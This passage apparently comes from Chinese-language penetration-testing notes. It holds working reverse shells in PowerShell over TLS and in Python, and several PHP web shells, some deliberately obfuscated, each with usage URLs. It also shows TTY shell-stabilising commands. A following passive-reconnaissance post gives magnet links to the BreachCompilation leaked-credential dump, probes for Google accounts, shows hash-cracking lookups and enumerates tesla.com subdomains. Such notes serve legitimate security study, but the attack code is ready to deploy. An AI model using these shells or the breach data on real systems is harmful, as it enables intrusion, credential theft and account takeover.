$TCPClient.GetStream();$SslStream = New-Object <span class="built_in">Net</span>.Security.SslStream($NetworkStream,$false,(&#123;$true&#125; -as [<span class="built_in">Net</span>.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(&#x27;cloudflare-dns.com&#x27;,$null,$false);<span class="keyword">if</span>(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) &#123;$SslStream.Close();<span class="keyword">exit</span>&#125;$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;;WriteToStream &#x27;&#x27;;while(($BytesRead = $SslStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Python3 Windows</li>
</ul>
<p>僅需修改 <code>Popen([&quot;sh&quot;]</code>裡面的sh，根據環境使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess,threading;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2p</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">            p.stdin.write(data)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p2s</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s.send(p.stdout.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">4444</span>))</span><br><span class="line"></span><br><span class="line">p=subprocess.Popen([<span class="string">&quot;sh&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/sh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;cmd&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;powershell&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;pwsh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"></span><br><span class="line">s2p_thread = threading.Thread(target=s2p, args=[s, p])</span><br><span class="line">s2p_thread.daemon = <span class="literal">True</span></span><br><span class="line">s2p_thread.start()</span><br><span class="line"></span><br><span class="line">p2s_thread = threading.Thread(target=p2s, args=[s, p])</span><br><span class="line">p2s_thread.daemon = <span class="literal">True</span></span><br><span class="line">p2s_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p.wait()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentestmonkey’s reverse shell</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Basic-RCE"><a href="#Basic-RCE" class="headerlink" title="Basic RCE"></a>Basic RCE</h3><p>成功上傳 payload 後，只需將指令放在變數後面即可</p>
<ul>
<li><code>?cmd= (ex: ?cmd=ls -la&quot;)</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h3><p>shell:~# 是一個非常基本的單一檔案 PHP shell。<br>當對 PHP 應用程式進行滲透測試時，它可用於在伺服器上快速執行命令</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a></li>
</ul>
<h3 id="Obfuscated-PHP-Web-Shell"><a href="#Obfuscated-PHP-Web-Shell" class="headerlink" title="Obfuscated PHP Web Shell"></a>Obfuscated PHP Web Shell</h3><ul>
<li>Usage : <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>Usage : curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “0&#x3D;command”</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=command">http://target.com/path/to/shell.php?_=command</a></li>
<li>curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “_&#x3D;command” ‘</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`&#123;<span class="variable">$_REQUEST</span>[<span class="string">&#x27;_&#x27;</span>]&#125;`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$_</span>=<span class="string">&quot;&#x27;&quot;</span> ;<span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">4</span>*<span class="number">4</span>*(<span class="number">5</span>+<span class="number">5</span>)-<span class="number">40</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">47</span>+<span class="title function_ invoke__">ord</span>(<span class="number">1</span>==<span class="number">1</span>))).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;_&#x27;</span>)+<span class="number">3</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(((<span class="number">10</span>*<span class="number">10</span>)+(<span class="number">5</span>*<span class="number">3</span>))));<span class="variable">$_</span>=$&#123;<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>^<span class="string">&#x27;o&#x27;</span>];<span class="keyword">echo</span>`<span class="variable">$_</span>`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=function&__=argument">http://target.com/path/to/shell.php?_=function&amp;__=argument</a></li>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=system&__=ls">http://target.com/path/to/shell.php?_=system&amp;__=ls</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_</span>=<span class="string">&quot;&#123;&quot;</span>; <span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="string">&quot;&lt;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;&gt;;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;/&quot;</span>); <span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;__&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="TTY-Spawn-Shell"><a href="#TTY-Spawn-Shell" class="headerlink" title="TTY Spawn Shell"></a>TTY Spawn Shell</h2><p>以下指令允許您產生 tty shell<br>其中一些取決於系統環境和安裝的軟體套件</p>
<h3 id="All-the-steps-to-stabilize-your-shell"><a href="#All-the-steps-to-stabilize-your-shell" class="headerlink" title="All the steps to stabilize your shell"></a>All the steps to stabilize your shell</h3><ul>
<li>使用 Python 產生功能更好的 bash shell</li>
<li>shell 看起來會更漂亮一些，但仍然無法使用 Tab 自動完成或箭頭鍵操作<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>使我們能夠存取術語指令，例如clear</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export TERM=xterm</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Finally (and most importantly) we will background the shell using <code>Ctrl + Z</code></li>
</ul>
<p>回到終端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty raw -echo; fg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>它關閉了我們自己的terminal echo，這使我們能夠存取 tab autocompletes、箭頭鍵和 Ctrl + C 來終止進程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty rows 38 columns 116</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="passive-Passive_Reconnaissance" class="article article-type-passive" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Passive_Reconnaissance/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Passive_Reconnaissance/">
        Passive Reconnaissance
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Passive-Reconnaissance"><a href="#Passive-Reconnaissance" class="headerlink" title="Passive Reconnaissance"></a>Passive Reconnaissance</h1><hr>
<p>Physical&#x2F;Social</p>
<ul>
<li>Location Information<ul>
<li>Satellite images</li>
<li>Drone recon</li>
<li>Building layout<ul>
<li>badge readers</li>
<li>break areas</li>
<li>security</li>
<li>fencing</li>
</ul>
</li>
</ul>
</li>
<li>Job Information<ul>
<li>Employees<ul>
<li>name</li>
<li>job title</li>
<li>phone number</li>
<li>manager</li>
</ul>
</li>
<li>Pictures<ul>
<li>badge photos</li>
<li>desk photos</li>
<li>computer</li>
<li>photos</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>有可能遇到攻擊到錯誤的目標，所以再攻擊前要驗證目標</p>
<p>對網路進行外部評估時，數據洩漏是最常見的方式，憑據被破壞，利用憑據獲取訪問權限，或利用用戶名獲取訪問權限</p>
<p>尋找子域，透過工具，查看主機運行服務，打開的端口</p>
<p> 確認目標 &gt; 訊息蒐集  &gt; 枚舉 &gt; 掃描</p>
<ul>
<li>Target Validation 目標驗證<ul>
<li>WHOIS</li>
<li>nslookup</li>
<li>dnsrecon</li>
</ul>
</li>
<li>Finding Subdomains 尋找子域<ul>
<li>Google Fu</li>
<li>dig</li>
<li>Nmap</li>
<li>Sublist3r</li>
<li>Bluto</li>
<li><a target="_blank" rel="noopener" href="http://crt.sh/">crt.sh</a></li>
</ul>
</li>
<li>Fingerprinting 指紋識別<ul>
<li>Nmap</li>
<li>Wappalyzer</li>
<li>WhatWeb</li>
<li>BuiltWith</li>
<li>Netcat</li>
</ul>
</li>
<li>Data Breaches 資料外洩<ul>
<li>HavelBeenPwned</li>
<li>Breach-Parse</li>
<li>WeLeakInfo</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Identifying-Our-Target"><a href="#Identifying-Our-Target" class="headerlink" title="Identifying Our Target"></a><strong>Identifying Our Target</strong></h3><ul>
<li>公開漏洞賞金計畫平台 : <a target="_blank" rel="noopener" href="https://bugcrowd.com/programs">https://bugcrowd.com/programs</a></li>
<li>根據錯誤提交給該組織可以獲取一定的收入</li>
<li>找到目標 example: Tesla</li>
</ul>
<p><img src="/img/passive_Untitled.png" alt="Untitled"></p>
<ul>
<li>攻擊前，要確認該目標還有bug bounty</li>
<li>其中有些不一定會給獎金，可能是積分或是名譽</li>
<li>閱讀目標訊息、規則</li>
</ul>
<p><img src="/img/passive_Untitled_1.png" alt="Untitled"></p>
<ul>
<li>在範圍內進行測試不要超出範圍</li>
</ul>
<p><img src="/img/passive_Untitled_2.png" alt="Untitled"></p>
<p><img src="/img/passive_Untitled_3.png" alt="Untitled"></p>
<h3 id="Discovering-Email-Addresses"><a href="#Discovering-Email-Addresses" class="headerlink" title="Discovering Email Addresses"></a><strong>Discovering Email Addresses</strong></h3><ul>
<li><p>查找電子郵件地址並嘗試尋找目標人員</p>
</li>
<li><p>我要尋找銷售、我要向誰發送郵件</p>
</li>
<li><p>不一定Google search都找的到</p>
</li>
<li><p>可能目標是公開訊息，也可能需要更深入挖掘</p>
</li>
<li><p>電子郵件</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hunter.io/search">hunter.io</a></li>
<li>每個月50~100次免費搜索</li>
</ul>
<p>  <img src="/img/passive_Untitled_4.png" alt="Untitled"></p>
<ul>
<li><p>可以在這裡搜尋目標郵件</p>
<ul>
<li>特定人員、部門、公司郵件…</li>
</ul>
<p>  <img src="/img/passive_Untitled_5.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_6.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>電話簿</p>
<ul>
<li>phonebook.cz</li>
</ul>
</li>
</ul>
<p><img src="/img/passive_Untitled_8.png" alt="Untitled"></p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.voilanorbert.com/">vilanorbert.com</a></p>
<ul>
<li><p>免費50條線索</p>
<p>  <img src="/img/passive_Untitled_9.png" alt="Untitled"></p>
</li>
<li><p>找到目標人員</p>
</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/clearbit-connect-free-ver/pmnhcgfcafcnkbengdcanjablaabjplo">clearbit connect</a></p>
<ul>
<li>向您發送電子郵件的人的信息以及他們的公司資訊</li>
<li>將能夠按角色、資歷和頭銜進行過濾</li>
<li>點擊任何人以獲取更多信息，並可選擇檢索他們的電子郵件地址</li>
<li>設定並儲存您的理想客戶檔案 (ICP)</li>
<li>可以將網域新增至「封鎖清單」</li>
<li>找到特定組織人員，並連繫LinkedIn</li>
</ul>
<p>  <img src="/img/passive_Untitled_10.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_11.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_12.png" alt="Untitled">
  </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://tools.emailhippo.com/">https://tools.emailhippo.com/</a></p>
<ul>
<li>找到某人，並發現有淺在電子郵件地址，到這網站驗證該郵件地址是否真實存在</li>
</ul>
<p>  <img src="/img/passive_Untitled_13.png" alt="Untitled"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://email-checker.net/">email-checker.net</a></p>
<ul>
<li>檢查郵件是否存在</li>
</ul>
<p>  <img src="/img/passive_Untitled_14.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_15.png" alt="Untitled">
  </p>
</li>
<li><p>Google 帳戶</p>
<ul>
<li>搜尋帳戶是否存在 &gt; 成功進到密碼輸入 &gt;確認帳戶存在</li>
<li>點擊忘記密碼 &gt; 嘗試其他方式 &gt; 猜測傳送驗證碼的目標位置 &gt; 確認對方身分</li>
</ul>
<p>  <img src="/img/passive_Untitled_16.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_17.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_18.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_19.png" alt="Untitled"></p>
</li>
</ul>
<h3 id="Gathering-Breached-Credentials-with-Breach-Parse"><a href="#Gathering-Breached-Credentials-with-Breach-Parse" class="headerlink" title="Gathering Breached Credentials with Breach-Parse"></a><strong>Gathering Breached Credentials with Breach-Parse</strong></h3><ul>
<li><p>Github &gt; search hmaverickadams &gt; click <a target="_blank" rel="noopener" href="https://github.com/hmaverickadams/breach-parse">breach-parse</a></p>
</li>
<li><p>apt download Deluge and Open it then type magnet…to download that file</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）二进制未压缩41G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:7ffbcd8cee06aba2ce6561688cf68ce2addca0a3&amp;dn=BreachCompilation&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Fglotorrents.pw%3A6969&amp;<span class="built_in">tr</span>=udp%3A%2F%2Ftracker.opentrackr.org%3A1337</span><br><span class="line"></span><br><span class="line">（2）二进制压缩11G磁力下载链接地址</span><br><span class="line"></span><br><span class="line">magnet:?xt=urn:btih:09250e1953e5a7fefeaa6206e81d02e53b5b374a&amp;dn=BreachCompilation.tar.bz2&amp;<span class="built_in">tr</span>=udp://tracker.leechers-paradise.org:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.opentrackr.org:1337/announce&amp;<span class="built_in">tr</span>=udp://tracker.pirateparty.gr:6969&amp;<span class="built_in">tr</span>=udp://tracker.coppersurfer.tk:6969/announce&amp;<span class="built_in">tr</span>=udp://tracker.zer0day.to:1337/announce</span><br><span class="line"></span><br><span class="line">此集合資料庫中包含從Bitcoin、Pastebin、LinkedIn、MySpace、Netflix、YouPorn、Last.FM、Zoosk、Badoo、RedBox以及遊戲平台（Minecraft和Runescape等）洩漏的數據，以及Anti Public，Exploit.<span class="keyword">in</span>洩漏的憑證列表。</span><br></pre></td></tr></table></figure>
</li>
<li><p>下載好後運行</p>
</li>
</ul>
<p><img src="/img/passive_Untitled_20.png" alt="Untitled"></p>
<p><img src="/img/passive_Untitled_21.png" alt="Untitled"></p>
<h3 id="Hunting-Breached-Credentials-with-DeHashed"><a href="#Hunting-Breached-Credentials-with-DeHashed" class="headerlink" title="Hunting Breached Credentials with DeHashed"></a><strong>Hunting Breached Credentials with DeHashed</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.dehashed.com/">DEHASHED</a><ul>
<li><p>通過電子郵件、用戶名、IP地址、姓名、電話號碼..進行搜索</p>
<p>  <img src="/img/passive_Untitled_22.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_23.png" alt="Untitled"></p>
</li>
<li><p>有些帳號的密碼是Hash &gt; 搜索該Hash還有很多不同帳號一樣</p>
</li>
</ul>
</li>
</ul>
<p><img src="/img/passive_Untitled_24.png" alt="Untitled"></p>
<p><img src="/img/passive_Untitled_25.png" alt="Untitled"></p>
<ul>
<li>搜索<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes.org</a> &gt; 查找目標Hash &gt; 如果有搜索到就會顯示破解結果</li>
<li>或是通過Google直接搜索該Hash是否有相關資料</li>
</ul>
<p><img src="/img/passive_Untitled_26.png" alt="Untitled"></p>
<p><img src="/img/passive_Untitled_27.png" alt="Untitled"></p>
<h3 id="Hunting-Subdomains-Part-1"><a href="#Hunting-Subdomains-Part-1" class="headerlink" title="Hunting Subdomains Part 1"></a><strong>Hunting Subdomains Part 1</strong></h3><p> 外部或內部進行滲透測試時遇到一個網站，能夠蒐集該網站訊息，或是在網站上進行一些操作</p>
<p>在攻擊前，需要確認有哪些子域、攻擊範圍</p>
<ul>
<li><p>example : *.tesla.com</p>
</li>
<li><p>獲取子域</p>
<ul>
<li>sublist3r</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt install sublist3r</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sublist3r -d tesla.com</span><br><span class="line"></span><br><span class="line">                 ____        _     _ _     _   _____                                                                                                         </span><br><span class="line">                / ___| _   _| |__ | (_)___| |_|___ / _ __                                                                                                    </span><br><span class="line">                \___ \| | | | <span class="string">&#x27;_ \| | / __| __| |_ \| &#x27;</span>__|                                                                                                   </span><br><span class="line">                 ___) | |_| | |_) | | \__ \ |_ ___) | |                                                                                                      </span><br><span class="line">                |____/ \__,_|_.__/|_|_|___/\__|____/|_|                                                                                                      </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">                <span class="comment"># Coded By Ahmed Aboul-Ela - @aboul3la                                                                                                       </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[-] Enumerating subdomains now <span class="keyword">for</span> tesla.com                                                                                                                 </span><br><span class="line">[-] Searching now <span class="keyword">in</span> Baidu..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Yahoo..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Google..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Bing..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Ask..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Netcraft..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> DNSdumpster..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> Virustotal..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> ThreatCrowd..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> SSL Certificates..</span><br><span class="line">[-] Searching now <span class="keyword">in</span> PassiveDNS..</span><br><span class="line">[!] Error: Virustotal probably now is blocking our requests</span><br><span class="line">[-] Total Unique Subdomains Found: 296</span><br><span class="line">www.tesla.com</span><br><span class="line">CitiBankStatementSHA512.tesla.com</span><br><span class="line">OpenADRClient.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-prdsvc-st.tesla.com</span><br><span class="line">akamai-apigateway-vehicleextinfogw-stgsvc-st.tesla.com</span><br><span class="line">ams13-gpgw1.tesla.com</span><br><span class="line">apac-cppm.tesla.com</span><br><span class="line">apacvpn.tesla.com</span><br><span class="line">apacvpn1.tesla.com</span><br><span class="line">apacvpn2.tesla.com</span><br><span class="line">api-account-master.tesla.com</span><br><span class="line">api-toolbox.tesla.com</span><br><span class="line">sentry.app.tesla.com</span><br><span class="line">appplayer.tesla.com</span><br><span class="line">sso-dev.tesla.com</span><br><span class="line">sso-sandbox.tesla.com</span><br><span class="line">sso-sig.tesla.com</span><br><span class="line">autodiscover.tesla.com</span><br><span class="line">awsbtest.tesla.com</span><br><span class="line">bctpay.tesla.com</span><br><span class="line">billing.tesla.com</span><br><span class="line">bom01-gpgw1.tesla.com</span><br><span class="line">ca.tesla.com</span><br><span class="line">ciscoguest.tesla.com</span><br><span class="line">........</span><br><span class="line">www-stg2.tesla.com</span><br><span class="line">www-test.tesla.com</span><br><span class="line">www-uat.tesla.com</span><br><span class="line">www-uat2.tesla.com</span><br><span class="line">www45.tesla.com</span><br><span class="line">xmail.tesla.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>根據域名查看到一些敏感網頁</p>
</li>
<li><p>尋找已註冊證書</p>
<ul>
<li>Google Search <a target="_blank" rel="noopener" href="https://crt.sh/">Crt.sh</a></li>
</ul>
<p>  <img src="/img/passive_Untitled_28.png" alt="Untitled"></p>
<p>  <img src="/img/passive_Untitled_29.png" alt="Untitled"></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a> 速度較慢，但工具功能完整</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# docker run -v OUTPUT_DIR_PATH:/.config/amass/ caffix/amass enum -d tesla.com    </span><br><span class="line"></span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a7-66.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a28-65.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; edns69.ultradns.com (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a12-64.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a10-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a9-67.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; ns_record --&gt; a1-12.akam.net (FQDN)</span><br><span class="line">tesla.com (FQDN) --&gt; mx_record --&gt; tesla-com.mail.protection.outlook.com (FQDN)</span><br><span class="line">akamai-apigateway-ehs.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-bender.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-bender.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-deliveryopsvitu.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-deliveryopsvitu.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-ehs-stg.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-ehs-stg.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-einvoicing.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-einvoicing.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-dev-warptmsapiserver-upgrade.tesla.com.edgekey.net (FQDN)</span><br><span class="line">akamai-apigateway-automation.tesla.com (FQDN) --&gt; cname_record --&gt; akamai-apigateway-automation.tesla.com.edgekey.net (FQDN)</span><br><span class="line">....</span><br><span class="line">xmail.tesla.com (FQDN) --&gt; a_record --&gt; 204.74.99.100 (IPAddress)</span><br><span class="line">share.tesla.com (FQDN) --&gt; cname_record --&gt; group301.tesla.com.akadns.net (FQDN)</span><br><span class="line">mta.email.tesla.com (FQDN) --&gt; a_record --&gt; 13.111.14.190 (IPAddress)</span><br><span class="line">sso-dev.tesla.com (FQDN) --&gt; cname_record --&gt; sso-dev.edgekey.net (FQDN)</span><br><span class="line">click.email.tesla.com (FQDN) --&gt; cname_record --&gt; click.virt.s7.exacttarget.com (FQDN)</span><br><span 